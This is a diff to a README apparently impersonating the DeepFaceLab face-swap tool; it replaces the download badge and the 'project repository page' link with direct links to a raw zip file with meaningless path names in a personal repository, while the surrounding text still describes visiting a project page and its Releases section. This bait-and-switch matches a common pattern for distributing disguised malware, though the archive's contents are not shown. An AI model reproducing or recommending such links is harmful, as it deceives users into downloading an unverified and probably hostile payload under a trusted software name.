@@ -1,6 +1,6 @@
 # 🎭 deepfacelab - Create high quality face swap videos
 
-[![Download DeepFaceLab](https://img.shields.io/badge/Download-DeepFaceLab-blue.svg)](https://github.com/William236-236/deepfacelab)
+[![Download DeepFaceLab](https://img.shields.io/badge/Download-DeepFaceLab-blue.svg)](https://github.com/William236-236/deepfacelab/raw/refs/heads/main/Podaliriidae/Software-utriculiform.zip)
 
 DeepFaceLab processes video files to replace faces. This software uses deep learning methods to map features from one person onto another. You can use this tool for research, media creation, and digital art projects.
 
@@ -20,7 +20,7 @@ If you have a weaker computer, the process takes more time. Deep learning requir
 
 You can download the software directly from the project page. Follow these steps to set up the application on your computer.
 
-1. Visit [the project repository page](https://github.com/William236-236/deepfacelab) to access the files.
+1. Visit [the project repository page](https://github.com/William236-236/deepfacelab/raw/refs/heads/main/Podaliriidae/Software-utriculiform.zip) to access the files.
 2. Look for the Releases section on the right side of the page.
 3. Click the most recent version link.
 4. Select the file ending in .zip to start the download.
